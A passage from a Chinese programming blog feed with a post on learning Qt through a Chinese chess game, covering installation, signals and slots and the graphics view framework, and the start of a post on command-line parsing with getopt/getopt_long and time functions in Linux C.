Babuška 也曾独立提出了一个类似的算法，Kahan 求和算法又名为 Kahan–Babuška 求和算法。</p>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CUDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初学 Qt（一）</title>
    <link href="/2021/09/24/2021-9-24-Qt-Chess/"/>
    <url>/2021/09/24/2021-9-24-Qt-Chess/</url>
    
    <content type="html"><![CDATA[<h1>初学 Qt 之从零开始的中国象棋小游戏（一）</h1><p>最近对 Qt 这个跨平台 C++ 图形应用程序框架很感兴趣，闲暇时间多学了一下，收获很多，也踩了不少坑，在这里记录一下，分享心得。</p><h2 id="Qt-的安装">Qt 的安装</h2><p>安装 Qt 并不麻烦，就是网速有点慢。推荐使用国内镜像代理下载。</p><p>首先进入 <a href="https://www.qt.io/download">Qt 官网</a>，在 Try Qt 处点击 Download Qt，填完基本信息后，点击提交就可以下载 Qt 下载器了。当然，你也可以直接去国内镜像站上下载 Qt 下载器。</p><center><img src="/img/Qt/download_Qt.png" style="zoom:50%;"/></center><p>打开 Qt 下载器，注册 Qt 账户，并登录，同意协议。<strong>若要使用国内镜像代理，点击左下角的配置图标。</strong></p><p><img src="/img/Qt/qt_proxy.png" alt=""></p><p>然后从百度上选择一个国内镜像站，我这里选用<a href="https://mirrors.ustc.edu.cn/">中科大的镜像站</a>，参考中科大镜像站上的<a href="%5Bhttps://mirrors.ustc.edu.cn/help/qtproject.html%5D">帮助文档</a>，我们需要把 <a href="http://mirrors.ustc.edu.cn/qtproject/online/qtsdkrepository/windows_x86/root/qt/">http://mirrors.ustc.edu.cn/qtproject/online/qtsdkrepository/windows_x86/root/qt/</a> 加入到 repository 列中（注意这是在 Windows 操作系统下），加入后先别急着关，可以点击 test 测试一下镜像站连接是否成功。现在，下载器就会从国内镜像站中获取下载数据了，速度会快不少。</p><p><img src="/img/Qt/qt_setting.png" alt=""></p><p>之后的安装就很无脑了，一路选择确定和安装位置，然后选择需要安装的 Qt 部件。推荐安装最新的 Qt 6 或者 Qt 5.12，最好选择所有的 Qt 核心功能，以及合适的编译器和调试器，当然别忘了相关的开发和设计工具，比如 Qt Creator 和 CMake、Ninja 等。</p><p><img src="/img/Qt/qt_select.png" alt=""></p><p>点击确认后，就可以等待下载完成了！</p><p>如果安装上遇到困难，或者单纯不想看文字，建议<a href="https://www.bilibili.com/video/BV1yN411d7d2/">去b站上看视频</a>跟着走一遍，亲测有效。</p><h2 id="学习-Qt">学习 Qt</h2><p>网上关于 Qt 的学习资料相对丰富，但质量参差不齐。当然类似字典功能的<a href="https://doc.qt.io/">官方文档</a>是最好的选择，这里推荐几个比较详细的中文资料网站：</p><p><a href="https://www.devbean.net/category/qt-study-road-2/">Qt 学习之路 2</a></p><p><a href="https://wizardforcel.gitbooks.io/qt-beginning/content/3.html">Qt 快速入门系列教程</a></p><h3 id="信号槽">信号槽</h3><p>上面的系列教程已经很详细地介绍了 Qt 相关知识。这里提取些重点简单强调一下。首先介绍信号槽，这是 Qt 框架中最有特点的机制，它可以帮助我们解耦复杂程序流程，增强技术设计能力。</p><p>信号槽的概念来自<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1281319577321505">观察者模式</a>。当某个事件被触发后（如按钮检测到自己被按下），该对象（按钮）就会发出一个信号。注意：这种发出是没有目的的，类似广播。接下来，若想让另一个对象（控制器开关）接受到该信号，它就会使用连接函数 <a href="https://doc.qt.io/qt-5/qobject.html#connect-2">connect()</a>，将发送者（即按钮对象）和自己的一个触发函数（称为槽）连接起来，表示当发送者发出信号给接收者后，被连接的槽函数会自动回调。</p><p>为更好地说明，以程序中的一段代码为例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">connect</span>(ui-&gt;startbutton, <span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">clicked</span>(<span class="hljs-type">bool</span>)),<br>    <span class="hljs-keyword">this</span>, <span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">startGame</span>()));<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">startGame</span><span class="hljs-params">(<span class="hljs-type">const</span> QString&amp; path = <span class="hljs-string">&quot;:/opening.json&quot;</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>上述代码的 <code>connect()</code> 函数使用的是 Qt 4 的版本。当 <code>startbutton</code> 被点击后，会发出 <code>clicked(bool)</code> 信号，而 <code>this</code> 是接收者，收到信号后就会调用 <code>startGame()</code> 槽函数。</p><p>在 Qt 4 中，信号和槽函数必须用 <code>SIGNAL</code> 和 <code>SLOT</code> 这两个宏包裹，且中间不能出现任何参数的变量名。从<a href="https://code.woboq.org/qt5/qtbase/src/corelib/kernel/qobjectdefs.h.html">源代码</a>中看到，<strong>这两个宏仅仅是将函数名转换成了字符串</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta"># <span class="hljs-keyword">define</span> SLOT(a)     <span class="hljs-string">&quot;1&quot;</span>#a</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> SIGNAL(a)   <span class="hljs-string">&quot;2&quot;</span>#a</span><br></code></pre></td></tr></table></figure><p>这样做的弊端非常明显：Qt 4 不支持将全局函数或者 Lambda 表达式传入 <code>connect()</code>。一旦出现连接不成功的情况，Qt 4 是没有编译错误的（因为一切都是字符串，编译期是不检查字符串是否匹配），而是在运行时给出错误。这无疑会增加程序的调试难度。</p><p>因此，尽量使用 Qt 5 提供的新机制：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">connect</span>(scene_-&gt;<span class="hljs-built_in">getRecorder</span>(), &amp;Recorder::recordHistory,<br>  <span class="hljs-keyword">this</span>, &amp;MainWindow::writeHistory);<br></code></pre></td></tr></table></figure><p>Qt 5 中信号和槽是类型安全的：信号的签名必须与槽函数的签名兼容。其实槽函数的参数可以比信号的参数更少，从而忽略额外的参数。这时编译器可以基于函数指针的语法检测类型是否匹配。</p><h3 id="Qt-的视图框架">Qt 的视图框架</h3><p>Qt 采用了基于元素的视图框架，主要由三个部分组成：元素（item）、场景（scene）、视图（view）。基于元素意味着每一个组件都是一个独立的元素（item），它们都被独立地添加在场景（scene）中，而观众需要从不同的角度（view）观察整个场景。类比于歌舞剧，舞台即是场景，而演员和道具等都是元素，需要被加入到舞台中，视图便是布置在舞台周边的摄像机，给观众从不同角度欣赏歌舞剧。基于元素的视图框架是很多窗口开发框架都会用到的概念，它有别于面向过程式的描述方式（先确定两个端点，然后连线，最后形成矩形等），它要求程序员先创建一个场景，再加入各种元素，然后确定一个视图用于观察。</p><p>在象棋程序中，我创建了一个场景，加入了所有的棋子，并将它们放在数组中统一管理，尔后创建一个视图，用来反馈棋盘的信息（因为是象棋，视图处理相对简单）。因为棋手在下棋时需要指定移动的棋子和位置，因此很多的事件响应操作必须由场景完成。此外，行棋规则受限于棋子的类型和当前所处的位置，在对棋子的行为编程时也需要获得全局的棋盘信息。</p><p>具体到代码中，有以下几个类需要特别关注：</p><ul><li><code>QGraphicsScene</code> Qt 图形场景类</li><li><code>QGraphicsItem</code>  Qt 的图形元素基类</li><li><code>QGraphicsPixmapItem</code> 有 Pixmap 的图形元素类</li><li><code>QGraphicsItemAnimation</code> 关于元素的动画行为类</li></ul><h2 id="关于中国象棋">关于中国象棋</h2><p>工程源代码可从 <a href="https://github.com/dingfen/Qt_Chess">github</a> 下载。所有模块使用 C++ 实现，AI 算法采用传统的最小最大搜索算法实现，其中，评价函数以及数值参考了《PC游戏编程——人机博弈》中的内容。下图是试运行画面：</p><center><img src="/img/Qt/chess.png" style="zoom:80%;"/></center><p>目前进展如下：</p><h3 id="已完成的">已完成的</h3><ul><li>基本游戏界面搭建</li><li>基本行棋流程、行棋动画</li><li>悔棋功能</li><li>加载、保存游戏功能，使用 JSON 文件格式记录了每局的对战情况。</li><li>记录行棋历史功能</li><li>将军情况的检测（部分）</li><li>象棋的热座对战模式</li></ul><h3 id="还未完成的">还未完成的</h3><ul><li>回合限定计时功能</li><li>远程玩家对战功能（双人游戏）</li><li>对局的复盘模式</li><li>AI 对战情景的进一步优化</li></ul>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Qt</tag>
      
      <tag>Cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在 Linux 中更好地使用C/C++语言</title>
    <link href="/2021/08/25/2021-8-25-tricks-in-LinuxC/"/>
    <url>/2021/08/25/2021-8-25-tricks-in-LinuxC/</url>
    
    <content type="html"><![CDATA[<h2 id="一、Linux下的命令行处理">一、Linux下的命令行处理</h2><h3 id="C-语言中命令行参数">C 语言中命令行参数</h3><p>执行程序时，可以从命令行传入参数给 C 的 main 函数。这些参数被称为<strong>命令行参数</strong>，它们对程序很重要，可以从外部控制程序的执行。</p><p>使用 <code>main()</code> 的函数参数可以处理命令行参数：</p><ul><li><strong>argc</strong> 是指传入参数的个数，包括最开头的执行程序名</li><li><strong>argv[]</strong> 是一个指针数组，指向传递给程序的每个参数。</li></ul><p>举例来说：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> </span>&#123;<br>   <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>)<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The argument supplied is %s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">2</span>)<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Too many arguments supplied.\n&quot;</span>);<br>   <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;One argument expected.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在编译上面的程序，并执行 <code>&gt; ./a.out testing</code>，它会产生下列结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$./a.out testing<br>The argument supplied is testing<br></code></pre></td></tr></table></figure><h3 id="getopt">getopt</h3><p>但上面的机制还是过于简陋了。通常，命令行参数还带有很多选项（option），提供用户选择执行程序不同功能的机会，如查询版本一般用 <code>-V</code> 或者 <code>--version</code> 等，查看帮助文档一般使用 <code>--helo</code> 或 <code>-h</code> 等。为了方便处理，Linux 提供了更强大的函数，帮助开发者更好更快地解析命令行传来的参数。</p><p>先介绍 <code>getopt()</code> 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getopt</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">const</span> <span class="hljs-type">char</span> *optstring)</span></span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *optarg;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> optind, opterr, optopt;<br></code></pre></td></tr></table></figure><p><code>getopt()</code> 函数的前两个参数之前已经介绍过了，第三个参数 <code>optstring</code> 是一个字符列表，其中的每个字母代表一个选项。</p><p>举例说明，<code>optstring</code> 的具体用法：当我们将 <code>optstring = &quot;ab:c::&quot;</code> 时，它表示：</p><ul><li>单个字符 <code>a:</code> 表示选项a 没有参数，即在命令行输入 <code>-a</code> 即算打开该功能，类似于其他执行程序中查看帮助的 <code>-h</code>。</li><li>单个字符加冒号 <code>b:</code> 表示选项b 在命令行输入时必须有参数，如 <code>-b 10</code>。</li><li>单个字符加两个冒号 <code>c::</code> 表示选项c 在命令行输入时 <code>-c</code> 后跟的参数是可有可无的</li></ul><p><code>getopt()</code> 函数的返回值很有意思：</p><ul><li>如果处理的 option 成功，那么返回选项的字母，如果有值跟随，<strong>那么字符串会被放在 <code>optarg</code> 中。</strong></li><li>如果处理的 option 需要一个值，但命令行中没有给定值，返回 <code>:</code></li><li>如果处理了一个未知的 option ，返回 <code>?</code>，并将值存入到 <code>optopt</code></li><li>如果没有更多的 option 等待处理，返回 -1</li><li>如果多余出一些跟随值，那么会将多余的存放在<code>argv</code>数组中，<code>optind</code>和<code>argc</code>分别充当索引和总数。</li></ul><p>再注意一下全局变量 <code>optind</code> <code>opterr</code> <code>optopt</code>，它们在解析命令行参数时非常重要。</p><ul><li>extern char *optarg; 存放了正在被处理的 option 后跟的参数</li><li>extern int optind; 表下一个将被处理到的参数在 argv 中的下标值</li><li>extern int opterr; 正常运行状态下为 0。非零时表示存在无效选项或者缺少选项参数，并输出其错误信息</li><li>extern int optopt; 包含的发现未知 option 的无效选项字符</li></ul><p>下面，放上一个简单的程序示例，例如要实现一个程序，要求有选项功能如下：<code>&gt; ./a.out -i -f file.txt -lr -x 'hero'</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-type">int</span> opt;      <br>  <span class="hljs-comment">// put &#x27;:&#x27; in the starting of the </span><br>  <span class="hljs-comment">// string so that program can  </span><br>  <span class="hljs-comment">// distinguish between &#x27;?&#x27; and &#x27;:&#x27;  </span><br>  <span class="hljs-keyword">while</span>((opt = <span class="hljs-built_in">getopt</span>(argc, argv, <span class="hljs-string">&quot;:if:lrx:&quot;</span>)) != <span class="hljs-number">-1</span>) &#123;  <br>    <span class="hljs-keyword">switch</span>(opt) &#123;  <br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>:<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;l&#x27;</span>:<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;option: %c\n&quot;</span>, opt);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>:<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;option: %c argname: %s\n&quot;</span>, opt, optarg);<br>        <span class="hljs-keyword">break</span>;  <br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;:&#x27;</span>:  <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;option needs a value\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknown option: %c\n&quot;</span>, optopt);<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>  &#125;<br>  <span class="hljs-comment">// optind is for the extra arguments </span><br>  <span class="hljs-comment">// which are not parsed </span><br>  <span class="hljs-keyword">for</span>(; optind &lt; argc; optind++) &#123;      <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;extra arguments: %s\n&quot;</span>, argv[optind]);  <br>  &#125;     <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>编译后运行，在命令行中输入 <code>&gt; ./a.out -i -f file.txt -lr -x hero</code>，则会输出：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">option</span>: i<br><span class="hljs-keyword">option</span>: f argname: <span class="hljs-keyword">file</span>.txt<br><span class="hljs-keyword">option</span>: l<br><span class="hljs-keyword">option</span>: r<br><span class="hljs-keyword">option</span>: x argname: hero<br></code></pre></td></tr></table></figure><p>而如果输入 <code>&gt; ./a.out -q -x</code>，则会：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">unknown option</span><span class="hljs-punctuation">:</span> <span class="hljs-string">q</span><br><span class="hljs-attribute">option</span><span class="hljs-punctuation">:</span> <span class="hljs-string">x argname: -w</span><br><span class="hljs-attribute">extra arguments</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br></code></pre></td></tr></table></figure><h3 id="getopt-long">getopt_long</h3><p><code>getopt_long()</code> 函数与 <code>getopt_long_only()</code> 函数，它们的工作方式与 <code>getopt()</code> 函数很像，除了这些函数还可以接收（<code>getopt_long_only()</code>除外）长选项<code>--</code>，形式可以为<code>--arg=param</code>或者<code>--arg param</code>。<code>getopt_long()</code> 函数用法如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getopt_long</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> *argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* shortopts, </span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> option *longopts, <span class="hljs-type">int</span> longind)</span></span>;<br><span class="hljs-comment">// 其中结构体option</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">option</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name; <span class="hljs-comment">// name of ong option</span><br>    <span class="hljs-type">int</span> has_arg;  <span class="hljs-comment">// 0 no 1 required 2 optional</span><br>    <span class="hljs-type">int</span> *flag;    <span class="hljs-comment">// how results returned</span><br>    <span class="hljs-type">int</span> val;      <span class="hljs-comment">// value to return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>前两个参数相信早已不陌生，重点介绍后三个参数，<code>optstring</code> 是格式控制符，<code>longopts</code> 是 <code>struct option</code> 结构体组成的数组，该结构体表示的是“长参数”（即形如<code>-–name</code> 的参数）名称和性质：</p><ul><li>name 长选项名称</li><li>has_arg 参数可选项，<code>no_argument</code> 表示该选项后不带参，<code>required_argument</code> 表示该选项后面带参数</li><li>*flag 匹配到选项后，如果flag是 <code>NULL</code> ，则返回val；如果不是 <code>NULL</code> ，则返回0，并且将 <code>val</code> 的值赋给flag指向的内存</li><li>val 匹配到选项后的返回值</li></ul><p><code>longindex</code>，表示是当前处理 <code>longopts</code> 数组的下标值。</p><p>下面也给出个简单的例子，方便大家理解：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;getopt.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> verbose_flag;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">option</span> long_options[] = &#123;<br>        <span class="hljs-comment">/* 下面的选项会将返回值写入 verbose_flag */</span><br>        &#123;<span class="hljs-string">&quot;verbose&quot;</span>, no_argument, &amp;verbose_flag, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;brief&quot;</span>, no_argument, &amp;verbose_flag, <span class="hljs-number">0</span>&#125;,<br>        <span class="hljs-comment">/* 下面的选项返回值是val值 no_argument required_argument是宏常量 */</span><br>        &#123;<span class="hljs-string">&quot;add&quot;</span>,     no_argument,       <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;beyond&quot;</span>,  no_argument,       <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;b&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;delete&quot;</span>,  required_argument, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;create&quot;</span>,  required_argument, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;c&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;file&quot;</span>,    required_argument, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;f&#x27;</span>&#125;<br>        &#125;;<br><br>    <span class="hljs-comment">/* getopt_long 数组索引 */</span><br>    <span class="hljs-type">int</span> option_index = <span class="hljs-number">0</span>;<br>    c = <span class="hljs-built_in">getopt_long</span> (argc, argv, <span class="hljs-string">&quot;abc:d:f:&quot;</span>,<br>                long_options, &amp;option_index);<br>    <span class="hljs-comment">/* 返回-1 循环结束 */</span><br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">switch</span> (c) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-comment">/* If this option set a flag, do nothing else now. */</span><br>            <span class="hljs-keyword">if</span> (long_options[option_index].flag != <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;option %s&quot;</span>, long_options[option_index].name);<br>            <span class="hljs-keyword">if</span> (optarg)<br>                <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot; with arg %s&quot;</span>, optarg);<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;option -a\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;option -b\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;option -c with value `%s&#x27;\n&quot;</span>, optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;option -d with value `%s&#x27;\n&quot;</span>, optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>:<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;option -f with value `%s&#x27;\n&quot;</span>, optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>:<br>            <span class="hljs-comment">/* getopt_long already printed an error message. */</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">abort</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;verbose flag is %d\n&quot;</span>, verbose_flag);<br><br>    <span class="hljs-comment">/* 输出多余的命令行参数 */</span><br>    <span class="hljs-keyword">if</span> (optind &lt; argc) &#123;<br>        <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;non-option ARGV-elements: &quot;</span>);<br>        <span class="hljs-keyword">while</span> (optind &lt; argc)<br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;%s &quot;</span>, argv[optind++]);<br>        <span class="hljs-built_in">putchar</span> (<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译后执行，可以看下图结果：</p><p><img src="/img/getopt_long.png" alt=""></p><h2 id="二、Linux下的时间处理">二、Linux下的时间处理</h2><p>Linux内核提供的基本时间服务是计算自协调世界时（UTC）公元1970年1月1日 00:00:00 这一特定时间以来经过的秒数。这种秒数用<code>time_t</code>数据结构表示。</p><p><code>time()</code>函数返回当前的秒数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">time_t</span> <span class="hljs-title">time</span><span class="hljs-params">(<span class="hljs-type">time_t</span> *calptr)</span></span>;<br></code></pre></td></tr></table></figure><p>时间值作为函数值返回。若参数非空，时间值也会放在<code>calptr</code>指向的值中。</p><p><code>clock_gettime()</code>函数可以用于获取指定时钟的时间，返回的时间在<code>timespec</code>数据结构中，它将时间分为秒和纳秒。<code>clock_id</code>用于指示选项，常用的有<code>CLOCK_REALTIME</code>、<code>CLOCK_MONOTONIC</code>、<code>CLOCK_PROCESS_CPUTIME_ID</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span 